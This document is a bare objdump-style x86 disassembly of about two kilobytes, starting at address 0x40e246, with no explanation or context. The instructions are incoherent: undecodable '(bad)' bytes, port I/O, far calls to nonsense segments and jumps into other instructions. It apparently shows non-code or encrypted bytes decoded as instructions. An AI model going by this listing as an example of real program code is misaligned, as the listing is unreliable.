  40e246:	test   eax,0x2519b988
  40e24b:	xor    eax,0x37e76a4f
  40e250:	in     eax,0xdc
  40e252:	sub    eax,0x80fee2b5
  40e257:	inc    ecx
  40e258:	mov    edx,0x3f7d638d
  40e25d:	pusha  
  40e25e:	mov    cl,0x21
  40e260:	icebp  
  40e261:	out    dx,al
  40e262:	jb     0x40e29f
  40e264:	push   esp
  40e265:	aaa    
  40e266:	sub    eax,0x10b31a28
  40e26b:	mov    ebx,0x37c64b4e
  40e270:	addr16 in al,dx
  40e272:	dec    ebp
  40e273:	cmp    BYTE PTR ss:[ecx],dl
  40e276:	and    DWORD PTR [edx-0x61],ebx
  40e279:	hlt    
  40e27a:	sub    DWORD PTR [ecx-0x53],eax
  40e27d:	gs loop 0x40e2be
  40e280:	xchg   ebx,eax
  40e281:	retf   
  40e282:	stc    
  40e283:	push   ds
  40e284:	cmp    edi,DWORD PTR [eax]
  40e286:	stos   DWORD PTR es:[edi],eax
  40e287:	mov    edx,0x1fcc551c
  40e28c:	mov    ebp,0x9373da2d
  40e291:	adc    dh,cl
  40e293:	scas   eax,DWORD PTR es:[edi]
  40e294:	retf   
  40e295:	and    DWORD PTR [esi-0x11],ecx
  40e298:	test   DWORD PTR [esi],0x317c33ed
  40e29e:	and    BYTE PTR [ebx],0x38
  40e2a1:	mov    ds:0xa76ab809,al
  40e2a6:	jb     0x40e301
  40e2a8:	aaa    
  40e2a9:	outs   dx,DWORD PTR ds:[esi]
  40e2aa:	in     eax,dx
  40e2ab:	rol    BYTE PTR [ebx+0x1b],1
  40e2ae:	in     al,dx
  40e2af:	xor    BYTE PTR [esi],0x81
  40e2b2:	and    al,0x34
  40e2b4:	pop    edx
  40e2b5:	(bad)  
  40e2b6:	mov    edi,0x9c17347f
  40e2bb:	call   0xf2c1:0xc262cafb
  40e2c2:	or     DWORD PTR [ecx],esi
  40e2c4:	int3   
  40e2c5:	mov    dh,BYTE PTR [edx+0x2a719734]
  40e2cb:	dec    ebp
  40e2cc:	pop    es
  40e2cd:	adc    al,0x4e
  40e2cf:	shl    BYTE PTR ds:0x80d43ad5,cl
  40e2d5:	adc    DWORD PTR [ecx+ebp*8+0x34],0x66286c59
  40e2dd:	ret    
  40e2de:	rcr    DWORD PTR [esi],1
  40e2e0:	fsubr  QWORD PTR [edx+0x11]
  40e2e3:	mov    ah,0xa6
  40e2e5:	push   edi
  40e2e6:	out    0x98,eax
  40e2e8:	mov    edi,eax
  40e2ea:	add    DWORD PTR [ecx+0x18],ecx
  40e2ed:	cmc    
  40e2ee:	and    eax,0x39f99884
  40e2f3:	les    esi,FWORD PTR [ecx]
  40e2f5:	mov    ch,0xb7
  40e2f7:	cmc    
  40e2f8:	test   eax,0xcd39bb9b
  40e2fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e2fe:	out    0xb8,eax
  40e300:	shl    DWORD PTR [ecx],0x71
  40e303:	cmp    eax,ebp
  40e305:	popa   
  40e306:	pop    ecx
  40e307:	shl    BYTE PTR [ebx+0x3b],0x3e
  40e30b:	mov    ds:0x1de14d73,al
  40e310:	mov    edi,0xaf003756
  40e315:	jg     0x40e2dd
  40e317:	xlat   BYTE PTR ds:[ebx]
  40e318:	fwait
  40e319:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e31a:	and    eax,0x1c87417c
  40e31f:	inc    esp
  40e320:	push   esi
  40e321:	jns    0x40e301
  40e323:	jb     0x40e2fb
  40e325:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e326:	(bad)  
  40e328:	fwait
  40e329:	xchg   esp,edi
  40e32b:	add    eax,0xbce955db
  40e330:	push   es
  40e331:	pop    eax
  40e332:	bound  esi,QWORD PTR [ebx+0x44b3ca08]
  40e338:	mov    ebx,0x5748a998
  40e33d:	xor    esp,ebx
  40e33f:	imul   edi,eax,0x8
  40e342:	or     DWORD PTR [edx-0x53b4339c],ecx
  40e348:	mov    WORD PTR [ebx+0x74],?
  40e34b:	mov    ds:0xddae4d14,al
  40e350:	xchg   edx,eax
  40e351:	xchg   edi,eax
  40e352:	lock ret 0x6130
  40e356:	dec    esi
  40e357:	xor    DWORD PTR ds:0x95ce1920,esi
  40e35d:	jno    0x40e323
  40e35f:	mov    al,0xd9
  40e361:	pop    edi
  40e362:	or     ebp,DWORD PTR [ecx-0x57]
  40e365:	push   0x8baf58cf
  40e36a:	es and eax,0x9cb1e574
  40e370:	scas   eax,DWORD PTR es:[edi]
  40e371:	js     0x40e3e2
  40e373:	xchg   BYTE PTR [edi+0x23],ah
  40e376:	cmp    eax,0x1307d3c
  40e37b:	fcmovnbe st,st(3)
  40e37d:	mov    DWORD PTR [eax-0x1dc6b430],edi
  40e383:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e384:	aad    0x3f
  40e386:	pop    ebp
  40e387:	fidivr WORD PTR [ebx-0x35f7d9da]
  40e38d:	sbb    al,0x93
  40e38f:	lods   al,BYTE PTR ds:[esi]
  40e390:	cld    
  40e391:	add    eax,0x807b073c
  40e396:	int3   
  40e397:	jmp    0x40e38e
  40e399:	ror    BYTE PTR [ebx+ebx*2+0xbaadbaf],0x2e
  40e3a1:	mov    ecx,0xa6338465
  40e3a6:	fnsave [edx+0x31baba21]
  40e3ac:	fstp   TBYTE PTR [ebx-0x77dab322]
  40e3b2:	jae    0x40e362
  40e3b4:	popf   
  40e3b5:	sub    eax,0xb78b5723
  40e3ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e3bb:	stos   BYTE PTR es:[edi],al
  40e3bc:	mov    dh,0x6f
  40e3be:	xor    DWORD PTR [edx-0x7ae107a0],esi
  40e3c4:	fsincos 
  40e3c6:	aas    
  40e3c7:	sbb    al,0x31
  40e3c9:	inc    ecx
  40e3ca:	add    ah,BYTE PTR [ebx]
  40e3cc:	jae    0x40e402
  40e3ce:	hlt    
  40e3cf:	or     BYTE PTR [ebx+0x306fb084],bh
  40e3d5:	(bad)  
  40e3d6:	pop    ebp
  40e3d7:	cmp    DWORD PTR [edx-0x72],0xe63893b5
  40e3de:	inc    ebp
  40e3df:	add    BYTE PTR ds:0x516f3b3,dl
  40e3e5:	cmp    eax,0xce3d02b6
  40e3ea:	fnclex 
  40e3ec:	shr    DWORD PTR [ecx-0x680dc5e4],1
  40e3f2:	out    0x5c,eax
  40e3f4:	or     DWORD PTR [ebx],0x1e
  40e3f7:	sbb    DWORD PTR [edi],esi
  40e3f9:	adc    al,0x51
  40e3fb:	jmp    0xa71e3249
  40e400:	or     edx,DWORD PTR [ebx+0x4b453fe0]
  40e406:	stos   DWORD PTR es:[edi],eax
  40e407:	jne    0x40e3e5
  40e409:	jl     0x40e3b3
  40e40b:	(bad)  
  40e40c:	pusha  
  40e40d:	test   BYTE PTR ds:0x4a3c9ecf,dl
  40e413:	ror    BYTE PTR [ecx+0x1fee289d],cl
  40e419:	ds lahf 
  40e41b:	sti    
  40e41c:	mov    ebx,DWORD PTR [edx]
  40e41e:	shl    DWORD PTR [eax],0x2d
  40e421:	adc    DWORD PTR [esi],0x56b370d2
  40e427:	mov    BYTE PTR [edi],al
  40e429:	pop    ebx
  40e42a:	das    
  40e42b:	and    dh,ch
  40e42d:	sbb    BYTE PTR [ecx+0x37],0x98
  40e431:	nop
  40e432:	xor    ebx,esp
  40e434:	jl     0x40e4a8
  40e436:	mov    ecx,0xe09199d8
  40e43b:	and    al,BYTE PTR [eax+0x10]
  40e43e:	inc    ebx
  40e43f:	push   ss
  40e440:	inc    ebp
  40e441:	xor    DWORD PTR [ebx],edx
  40e443:	retf   0x48e5
  40e446:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e447:	ds jge 0x40e49e
  40e44a:	adc    eax,0x9a784378
  40e44f:	pop    ecx
  40e450:	sti    
  40e451:	cmp    ecx,DWORD PTR [eax+0x725e030a]
  40e457:	xchg   esp,eax
  40e458:	(bad)  
  40e459:	mov    eax,0x93bbbec4
  40e45e:	sub    DWORD PTR [eax+ebp*1+0x25],0x59
  40e463:	daa    
  40e464:	cmp    al,0xae
  40e466:	and    BYTE PTR [ecx+0x3],ch
  40e469:	pop    esp
  40e46a:	adc    eax,0x678d725c
  40e46f:	out    0xbc,eax
  40e471:	sbb    al,0xb9
  40e473:	push   edx
  40e474:	pop    esi
  40e475:	xor    BYTE PTR [ebx-0x4a969f93],bh
  40e47b:	daa    
  40e47c:	sub    esp,DWORD PTR [eax+0x6c]
  40e47f:	xchg   ecx,eax
  40e480:	inc    esi
  40e481:	aad    0xa8
  40e483:	mov    dh,0xa3
  40e485:	mov    eax,ds:0x83510d74
  40e48a:	dec    esp
  40e48b:	sbb    esi,DWORD PTR [eax]
  40e48d:	jae    0x40e44b
  40e48f:	repz test BYTE PTR [edx-0x36],dh
  40e493:	aas    
  40e494:	popf   
  40e495:	scas   al,BYTE PTR es:[edi]
  40e496:	mov    ss,WORD PTR [edx+0x69]
  40e499:	outs   dx,BYTE PTR ds:[esi]
  40e49a:	xor    bl,BYTE PTR [eax+0x1fe0b563]
  40e4a0:	push   eax
  40e4a1:	jbe    0x40e4fe
  40e4a3:	ins    DWORD PTR es:[edi],dx
  40e4a4:	rol    DWORD PTR [esi-0x1f3ca132],0xc5
  40e4ab:	std    
  40e4ac:	jle    0x40e4c3
  40e4ae:	push   edi
  40e4af:	adc    eax,0xa0a789c4
  40e4b4:	push   0x8f69706c
  40e4b9:	pop    eax
  40e4ba:	cmc    
  40e4bb:	mov    ebx,0xd502f5b6
  40e4c0:	je     0x40e537
  40e4c2:	jb     0x40e4b7
  40e4c4:	mov    ds:0xcc9acc6a,eax
  40e4c9:	(bad)  
  40e4ca:	jno    0x40e47f
  40e4cc:	imul   ebx,DWORD PTR [ecx],0xffffffb3
  40e4cf:	imul   ebp,DWORD PTR [edx-0xf],0xf7452d8a
  40e4d6:	jbe    0x40e4b8
  40e4d8:	enter  0x9316,0xec
  40e4dc:	mov    eax,0x64d8339
  40e4e1:	fsubr  QWORD PTR [edi+0x339a085d]
  40e4e7:	loope  0x40e566
  40e4e9:	mov    edx,0x99c7db46
  40e4ee:	mov    ch,0xd9
  40e4f0:	jns    0x40e51f
  40e4f2:	pop    es
  40e4f3:	inc    esi
  40e4f4:	xchg   BYTE PTR [eiz*1-0x4569da48],dl
  40e4fb:	sbb    al,0x74
  40e4fd:	loope  0x40e48b
  40e4ff:	je     0x40e4cc
  40e501:	sub    eax,0x85346e5b
  40e506:	data16 adc al,bh
  40e509:	(bad)  
  40e50a:	adc    BYTE PTR [edi],dh
  40e50c:	ins    BYTE PTR es:[edi],dx
  40e50d:	imul   esi,DWORD PTR [esi-0x3c],0x52246c41
  40e514:	xchg   edi,eax
  40e515:	mov    ds:0xd641cc6e,al
  40e51a:	push   esp
  40e51b:	add    eax,0xddf01a89
  40e520:	loope  0x40e4cd
  40e522:	out    dx,eax
  40e523:	xchg   edi,eax
  40e524:	push   0x4a202e25
  40e529:	sub    ch,BYTE PTR [ebx-0x5ee525cb]
  40e52f:	cmp    bl,BYTE PTR [eax]
  40e531:	cmp    eax,0x913d2a43
  40e536:	mov    ecx,DWORD PTR [ebx+0xb]
  40e539:	out    dx,al
  40e53a:	mov    ebx,0x7c8eafa7
  40e53f:	push   ecx
  40e540:	dec    esp
  40e541:	jecxz  0x40e55b
  40e543:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e544:	sub    DWORD PTR [edx+eax*1-0x42],esi
  40e548:	sbb    dl,ah
  40e54a:	js     0x40e566
  40e54c:	pop    es
  40e54d:	cmp    al,0xf4
  40e54f:	mov    eax,0x44054d29
  40e554:	dec    esi
  40e555:	inc    ebp
  40e556:	sbb    dl,al
  40e558:	fisub  WORD PTR [ecx]
  40e55a:	push   0xc9888d31
  40e55f:	out    0x10,eax
  40e561:	xchg   edi,eax
  40e562:	loop   0x40e553
  40e564:	mov    bh,0xda
  40e566:	outs   dx,DWORD PTR ds:[esi]
  40e567:	mov    esi,0x77c3b54e
  40e56c:	test   eax,0xcb2ccff7
  40e571:	sbb    bl,al
  40e573:	sbb    eax,0x1846788c
  40e578:	adc    eax,0x325c0fe4
  40e57d:	push   eax
  40e57e:	frstor [ebx]
  40e580:	outs   dx,DWORD PTR ds:[esi]
  40e581:	imul   ebp,esp,0x75
  40e584:	sub    DWORD PTR [eax+eiz*8],ecx
  40e587:	xchg   esp,eax
  40e588:	cmp    ch,BYTE PTR [ecx-0x285f6acb]
  40e58e:	jmp    0xd7da02ff
  40e593:	cs push cs
  40e595:	xlat   BYTE PTR ds:[ebx]
  40e596:	push   esp
  40e597:	xchg   DWORD PTR [esi+0x7c],ebp
  40e59a:	test   al,0x1e
  40e59c:	imul   ebx,DWORD PTR [edx-0x6d781f13],0x5a
  40e5a3:	rcl    DWORD PTR [edx+0x1f1fcf31],cl
  40e5a9:	(bad)  
  40e5ab:	mov    ds,WORD PTR [ecx-0x40f95a2b]
  40e5b1:	js     0x40e5de
  40e5b3:	std    
  40e5b4:	out    dx,eax
  40e5b5:	pop    eax
  40e5b6:	mov    bl,0x40
  40e5b8:	sub    DWORD PTR [edx],0xffffffb4
  40e5bb:	mov    edi,0x70c2535b
  40e5c0:	adc    BYTE PTR [eax+0x1ebdc804],al
  40e5c6:	pop    ds
  40e5c7:	call   0x9cd4:0x6448e25a
  40e5ce:	xchg   esp,eax
  40e5cf:	cmp    eax,0x3f470dff
  40e5d4:	xchg   esi,eax
  40e5d5:	cmp    al,0xa
  40e5d7:	mov    al,ds:0x939d8284
  40e5dc:	(bad)  
  40e5dd:	cli    
  40e5de:	or     BYTE PTR [edi-0x1c],ch
  40e5e1:	aaa    
  40e5e2:	mov    cl,0xd7
  40e5e4:	retf   0x85eb
  40e5e7:	jbe    0x40e5a2
  40e5e9:	ja     0x40e59c
  40e5eb:	add    BYTE PTR [esi],al
  40e5ed:	or     al,0xbc
  40e5ef:	mov    cs,WORD PTR [edi-0x40318a7b]
  40e5f5:	rol    DWORD PTR [ecx+0x53],0xd1
  40e5f9:	xchg   DWORD PTR [eax-0xd7878e5],esp
  40e5ff:	sub    dl,BYTE PTR [edx-0x5e]
  40e602:	ret    0x1cd9
  40e605:	call   0x2028f0de
  40e60a:	es jbe 0x40e617
  40e60d:	or     eax,0xf065a5e0
  40e612:	mov    eax,0xd5634be5
  40e617:	mul    BYTE PTR [edi]
  40e619:	fstp   TBYTE PTR [edx+0x5c01dd46]
  40e61f:	mov    edx,0x70bc9716
  40e624:	dec    ebx
  40e625:	adc    ebp,esi
  40e627:	mov    al,0xaa
  40e629:	inc    esi
  40e62a:	inc    ebx
  40e62b:	jnp    0x40e5af
  40e62d:	xchg   ebx,eax
  40e62e:	cs stc 
  40e630:	or     esp,DWORD PTR [edx+0x55]
  40e633:	stos   DWORD PTR es:[edi],eax
  40e634:	cdq    
  40e635:	test   al,0x8
  40e637:	out    0x7c,al
  40e639:	clc    
  40e63a:	mov    ebp,0xef238be6
  40e63f:	fistp  DWORD PTR [eax-0x60]
  40e642:	leave  
  40e643:	push   0xffffffc9
  40e645:	push   edx
  40e646:	out    dx,eax
  40e647:	mov    dl,ch
  40e649:	in     eax,dx
  40e64a:	imul   edi,DWORD PTR [ebx-0x44],0x19
  40e64e:	into   
  40e64f:	mov    esi,0x23464f48
  40e654:	test   al,0x70
  40e656:	push   ecx
  40e657:	(bad)  
  40e658:	mov    ?,WORD PTR [eax-0x56b3c65a]
  40e65e:	or     ch,BYTE PTR [eax+eiz*2-0x3ea8979e]
  40e665:	cwde   
  40e666:	push   edi
  40e667:	sub    BYTE PTR [ecx+0x72],0xb5
  40e66b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e66c:	xchg   esp,eax
  40e66d:	test   eax,0x6517fbe1
  40e672:	xor    eax,0xb0fd182d
  40e677:	jmp    0x8b91:0x270668b2
  40e67e:	inc    ebx
  40e67f:	xchg   BYTE PTR [edx+0x18],bh
  40e682:	jnp    0x40e688
  40e684:	nop
  40e685:	mov    ebx,0x5fbe6549
  40e68a:	enter  0xdd09,0xd1
  40e68e:	sub    al,0x84
  40e690:	jle    0x40e66b
  40e692:	sub    eax,0xa32c4a25
  40e697:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e698:	push   edi
  40e699:	test   DWORD PTR [ecx+0x12],eax
  40e69c:	ds sbb eax,0x1b7f2cc3
  40e6a2:	sub    BYTE PTR [ebx],0x2d
  40e6a5:	sbb    al,0xec
  40e6a7:	cmp    edi,edi
  40e6a9:	jb     0x40e64e
  40e6ab:	(bad)  
  40e6ad:	idiv   ebp
  40e6af:	fidivr WORD PTR [edx-0x4e]
  40e6b2:	sub    eax,0x39a62719
  40e6b7:	jnp    0x40e679
  40e6b9:	pop    edi
  40e6ba:	bound  ebx,QWORD PTR [ebx-0x12]
  40e6bd:	dec    edx
  40e6be:	xchg   BYTE PTR [ebx],ah
  40e6c0:	xchg   ecx,eax
  40e6c1:	(bad)  
  40e6c2:	and    dh,BYTE PTR [eax]
  40e6c4:	dec    esi
  40e6c5:	jecxz  0x40e6cf
  40e6c7:	ja     0x40e671
  40e6c9:	and    eax,0x67d3e363
  40e6ce:	adc    bh,BYTE PTR [ecx-0x35fbe350]
  40e6d4:	adc    BYTE PTR [edx-0x59],ah
  40e6d7:	pop    es
  40e6d8:	out    dx,eax
  40e6d9:	gs nop
  40e6db:	popa   
  40e6dc:	in     eax,dx
  40e6dd:	mov    gs,WORD PTR [esi-0x7b6bdf8d]
  40e6e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e6e4:	xlat   BYTE PTR ds:[ebx]
  40e6e5:	xor    eax,0xccb725e7
  40e6ea:	add    dh,BYTE PTR [edi+ebx*4+0x6591d071]
  40e6f1:	push   ss
  40e6f2:	dec    ebp
  40e6f3:	cmp    DWORD PTR [esi-0x2ceb593a],0x43fa7d15
  40e6fd:	mov    eax,0xcc2319dd
  40e702:	sbb    DWORD PTR [eax-0x5be0ea55],edi
  40e708:	pop    esp
  40e709:	or     al,0x3b
  40e70b:	sbb    al,0xf1
  40e70d:	mov    esp,0xa4c6458
  40e712:	xchg   ebx,ebx
  40e714:	(bad)  [ecx-0x2d]
  40e717:	push   0xffffff83
  40e719:	push   ebp
  40e71a:	cld    
  40e71b:	inc    edx
  40e71c:	add    BYTE PTR [edx+0x5d],cl
  40e71f:	push   edx
  40e720:	daa    
  40e721:	dec    ebx
  40e722:	int3   
  40e723:	adc    eax,0xa6baf08d
  40e728:	pop    es
  40e729:	jo     0x40e6af
  40e72b:	daa    
  40e72c:	gs xchg esi,eax
  40e72e:	call   0x8b68:0x15ac823
  40e735:	jo     0x40e71f
  40e737:	int3   
  40e738:	in     eax,dx
  40e739:	cmp    DWORD PTR [ebp+eiz*8-0x1207eaad],esi
  40e740:	dec    eax
  40e741:	outs   dx,DWORD PTR ds:[esi]
  40e742:	hlt    
  40e743:	pop    eax
  40e744:	(bad)  [ebp+0x482a5517]
  40e74a:	jo     0x40e737
  40e74c:	mov    eax,0xaf9e95f6
  40e751:	cmp    ebp,DWORD PTR [esp+esi*4]
  40e754:	jmp    FWORD PTR [ebp+0x795ab46]
  40e75a:	or     eax,0xa85f7c27
  40e75f:	push   esi
  40e760:	sub    DWORD PTR [eax-0xce3f415],esp
  40e766:	xchg   DWORD PTR [edi],ecx
  40e768:	test   BYTE PTR [ebp+0x4d],ch
  40e76b:	pop    ss
  40e76c:	push   esp
  40e76d:	lock sbb ebx,DWORD PTR [edx+edi*1]
  40e771:	imul   edi,DWORD PTR [esi-0x2f],0x3e
  40e775:	in     al,dx
  40e776:	xlat   BYTE PTR ds:[ebx]
  40e777:	call   0x8f11e035
  40e77c:	push   esp
  40e77d:	push   ecx
  40e77e:	push   ecx
  40e77f:	in     al,dx
  40e780:	inc    edx
  40e781:	(bad)  
  40e782:	mov    esp,0x864c7323
  40e787:	dec    ebp
  40e788:	retf   
  40e789:	rol    DWORD PTR [eax],1
  40e78b:	inc    ebx
  40e78c:	xor    eax,0x54867a01
  40e791:	sub    BYTE PTR [ebp-0x2d],bh
  40e794:	lahf   
  40e795:	fwait
  40e796:	or     DWORD PTR [eax+0x6b6c7e96],edx
  40e79c:	xor    al,0xac
  40e79e:	fist   DWORD PTR [eax-0x60d6214c]
  40e7a4:	adc    al,0xe7
  40e7a6:	pop    ebx
  40e7a7:	mov    ch,0x2a
  40e7a9:	pop    eax
  40e7aa:	dec    eax
  40e7ab:	adc    eax,0xb1e1c81a
  40e7b0:	push   es
  40e7b1:	dec    edx
  40e7b2:	and    cl,al
  40e7b4:	sbb    eax,0x67c5e3e3
  40e7b9:	cmc    
  40e7ba:	cmp    BYTE PTR [ebp+0x56],ah
  40e7bd:	int    0xd5
  40e7bf:	inc    esi
  40e7c0:	mov    ah,0xa2
  40e7c2:	adc    BYTE PTR [ebx],dh
  40e7c4:	pop    ebx
  40e7c5:	jmp    0x40e77e
  40e7c7:	sbb    dl,BYTE PTR [esi]
  40e7c9:	inc    esi
  40e7ca:	imul   edi,DWORD PTR [ecx],0x7f292fd3
  40e7d0:	xor    DWORD PTR ds:[eax],ecx
  40e7d3:	or     eax,0x6cfabd58
  40e7d8:	retf   
  40e7d9:	(bad)  
  40e7da:	addr16 mov esi,0x53fca5f0
  40e7e0:	or     dl,dl
  40e7e2:	mov    bh,0x7b
  40e7e4:	mov    dh,dl
  40e7e6:	xchg   esp,eax
  40e7e7:	cmp    al,0xd5
  40e7e9:	pop    ecx
  40e7ea:	inc    ecx
  40e7eb:	dec    esp
  40e7ec:	cmp    DWORD PTR [bx+0x2b],ebx
  40e7f0:	imul   DWORD PTR ds:0xa925bb55
  40e7f6:	int3   
  40e7f7:	push   ebx
  40e7f8:	imul   edx,DWORD PTR [ecx-0x2b],0x6e7c760a
  40e7ff:	cld    
  40e800:	adc    eax,0x3e152dd5
  40e805:	add    ch,BYTE PTR [esi]
  40e807:	imul   esi,DWORD PTR [ebp-0xb],0x2
  40e80b:	stc    
  40e80c:	or     DWORD PTR [esi],0x8891ee15
  40e812:	jp     0x40e7fb
  40e814:	frstor [edx+0x31]
  40e817:	or     BYTE PTR [edx],dl
  40e819:	rol    edx,cl
  40e81b:	clc    
  40e81c:	mov    esi,0xa14f43f2
  40e821:	jo     0x40e894
  40e823:	sar    edi,cl
  40e825:	(bad)  
  40e827:	mov    bh,0x85
  40e829:	dec    eax
  40e82a:	mov    edi,0xa40d1a54
  40e82f:	fcmovnbe st,st(4)
  40e831:	ss lock (bad) 
  40e835:	iret   
  40e836:	pop    edx
  40e837:	sar    BYTE PTR [esi+edx*2-0x38],1
  40e83b:	ja     0x40e7fd
  40e83d:	mov    al,0x3c
  40e83f:	jb     0x40e849
  40e841:	xchg   edi,eax
  40e842:	rol    DWORD PTR [ecx+0x6e],0xa9
  40e846:	xchg   DWORD PTR [edi+edi*1-0x477d5ca3],esi
  40e84d:	bound  ebp,QWORD PTR [ebx+esi*8]
  40e850:	fimul  WORD PTR [esp+ebp*1-0x49]
  40e854:	jmp    0xb35a:0x862b7e35
  40e85b:	mov    edi,0x537fccb3
  40e860:	shl    DWORD PTR [ebx+0x23e3d083],1
  40e866:	xchg   edi,eax
  40e867:	mov    ecx,0x9f763cf8
  40e86c:	or     eax,0x5c5d994c
  40e871:	push   edx
  40e872:	mov    edi,DWORD PTR [esi]
  40e874:	sbb    DWORD PTR [edx-0x3b1df422],esi
  40e87a:	sub    dh,BYTE PTR [edi]
  40e87c:	mov    eax,ds:0xaa573786
  40e881:	fldcw  WORD PTR [eax+ebx*1]
  40e884:	mov    ch,al
  40e886:	xchg   esi,eax
  40e887:	pop    ebp
  40e888:	xor    al,bl
  40e88a:	cdq    
  40e88b:	jp     0x40e88a
  40e88d:	fld    TBYTE PTR [eax]
  40e88f:	aad    0x34
  40e891:	jp     0x40e8ec
  40e893:	outs   dx,DWORD PTR ds:[esi]
  40e894:	rcl    DWORD PTR [eax],1
  40e896:	push   0x2
  40e898:	retf   
  40e899:	add    al,0xcb
  40e89b:	pop    ss
  40e89c:	pop    eax
  40e89d:	iret   
  40e89e:	les    ebx,FWORD PTR [eax-0x31]
  40e8a1:	jns    0x40e82a
  40e8a3:	scas   eax,DWORD PTR es:[edi]
  40e8a4:	cwde   
  40e8a5:	inc    ebx
  40e8a6:	jae    0x40e8fb
  40e8a8:	pushf  
  40e8a9:	push   esp
  40e8aa:	pop    ds
  40e8ab:	or     al,BYTE PTR [esi]
  40e8ad:	leave  
  40e8ae:	sbb    eax,0xcae68d3d
  40e8b3:	jge    0x40e8f7
  40e8b5:	push   ss
  40e8b6:	mov    bp,0x7288
  40e8ba:	enter  0xfe79,0xa9
  40e8be:	inc    esi
  40e8bf:	repnz imul esp,edx,0xffffffe7
  40e8c3:	(bad)  [esi]
  40e8c5:	outs   dx,DWORD PTR ds:[esi]
  40e8c6:	xor    ah,bh
  40e8c8:	cmp    DWORD PTR [edi-0x72946541],esp
  40e8ce:	stos   BYTE PTR es:[edi],al
  40e8cf:	mov    ah,0xb4
  40e8d1:	and    DWORD PTR [edx],esp
  40e8d3:	dec    edx
  40e8d4:	fild   DWORD PTR [ebx+0x1da803cf]
  40e8da:	(bad)  
  40e8db:	out    dx,al
  40e8dc:	test   DWORD PTR [eax],eax
  40e8de:	data16 aam 0x61
  40e8e1:	ficomp WORD PTR [edi]
  40e8e3:	inc    ebx
  40e8e4:	aas    
  40e8e5:	dec    eax
  40e8e6:	push   ebp
  40e8e7:	or     edx,edx
  40e8e9:	stos   DWORD PTR es:[edi],eax
  40e8ea:	jo     0x40e909
  40e8ec:	jo     0x40e880
  40e8ee:	repz push 0x28f84518
  40e8f4:	sub    ebp,esp
  40e8f6:	cmp    al,0xb1
  40e8f8:	adc    eax,0x7cdf3ead
  40e8fd:	adc    DWORD PTR [edx-0x65534633],ebp
  40e903:	jne    0x40e926
  40e905:	gs dec edi
  40e907:	div    DWORD PTR [eax]
  40e909:	(bad)  
  40e90a:	iret   
  40e90b:	inc    ecx
  40e90c:	lea    edi,[ebx-0x7d]
  40e90f:	pushf  
  40e910:	adc    edi,esi
  40e912:	lods   al,BYTE PTR ds:[esi]
  40e913:	cmp    BYTE PTR [edi+ebp*2+0x5],ch
  40e917:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e918:	nop
  40e919:	fdivrp st(3),st
  40e91b:	push   edx
  40e91c:	pushf  
  40e91d:	fld    DWORD PTR [ecx+0x30b3d7c1]
  40e923:	popf   
  40e924:	aaa    
  40e925:	call   0xc25f89da
  40e92a:	sub    eax,0x7ca84bf2
  40e92f:	add    eax,DWORD PTR [edi+ebp*4-0xbd49c6b]
  40e936:	cmp    DWORD PTR [edx+0x38badf99],0x8f7a2445
  40e940:	out    dx,al
  40e941:	loopne 0x40e93e
  40e943:	xchg   BYTE PTR [ebp-0xdec6455],dl
  40e949:	or     ebx,ebp
  40e94b:	out    dx,eax
  40e94c:	sub    eax,0xfdbb7648
  40e951:	leave  
  40e952:	pop    esp
  40e953:	mov    ah,0x2a
  40e955:	mov    dl,0x9d
  40e957:	popf   
  40e958:	mov    BYTE PTR [esi],bh
  40e95a:	arpl   WORD PTR [ecx],bp
  40e95c:	(bad)  
  40e95d:	push   0x68
  40e95f:	inc    ebx
  40e960:	out    0x34,eax
  40e962:	std    
  40e963:	mov    BYTE PTR [edi],dl
  40e965:	aam    0xe
  40e967:	xchg   ebp,eax
  40e968:	xor    eax,0x8e7fb13
  40e96d:	or     eax,0x658b18e9
  40e972:	js     0x40e9a9
  40e974:	mov    ch,0x34
  40e976:	jo     0x40e92f
  40e978:	xor    eax,0xb201e9ce
  40e97d:	mov    esp,0x5913f0bb
  40e982:	into   
  40e983:	jbe    0x40e94a
  40e985:	mov    dh,0x5e
  40e987:	or     al,0x6c
  40e989:	pop    ds
  40e98a:	(bad)  
  40e98b:	out    0x77,eax
  40e98d:	ret    0x916a
  40e990:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e991:	ja     0x40e9ae
  40e993:	adc    DWORD PTR [esp+ebx*4+0x4a],esi
  40e997:	or     ecx,DWORD PTR ds:0x8f509eb6
  40e99d:	sbb    ebx,DWORD PTR [edi+0x52]
  40e9a0:	mov    esi,0xe7b6010c
  40e9a5:	in     al,0x10
  40e9a7:	sbb    eax,0xbe4d5155
  40e9ac:	mov    cl,BYTE PTR [ebp+0x7a]
  40e9af:	jo     0x40e996
  40e9b1:	fwait
  40e9b2:	push   0xda1cce0a
  40e9b7:	jge    0x40e945
  40e9b9:	ret    
  40e9ba:	in     al,0xeb
  40e9bc:	mov    ebx,0xcb2f3470
  40e9c1:	push   0x1
  40e9c3:	adc    BYTE PTR [esi],bh
  40e9c5:	repz push 0xd0e50423
  40e9cb:	lods   al,BYTE PTR ds:[esi]
  40e9cc:	and    eax,0x68d8110e
  40e9d1:	jg     0x40e9be
  40e9d3:	bound  edi,QWORD PTR [eax]
  40e9d5:	add    DWORD PTR [ebp-0x71],0x12
  40e9d9:	enter  0xe0c0,0xe3
  40e9dd:	dec    ecx
  40e9de:	push   0xffffffb7
  40e9e0:	xor    ecx,DWORD PTR [eax-0x12]
  40e9e3:	dec    esp
  40e9e4:	(bad)  
  40e9e5:	int3   
  40e9e6:	dec    edi
  40e9e7:	pop    edx
  40e9e8:	adc    BYTE PTR [eax+0x1eceaf6f],ch
  40e9ee:	pop    es
  40e9ef:	in     eax,0x6d
  40e9f1:	bound  esi,QWORD PTR [edx+0x54]
  40e9f4:	add    ebp,DWORD PTR [eax+0x53]
  40e9f7:	cmp    DWORD PTR [eax],0x34
  40e9fa:	and    eax,0x9ed379c0
  40e9ff:	push   esp
  40ea00:	scas   al,BYTE PTR es:[edi]
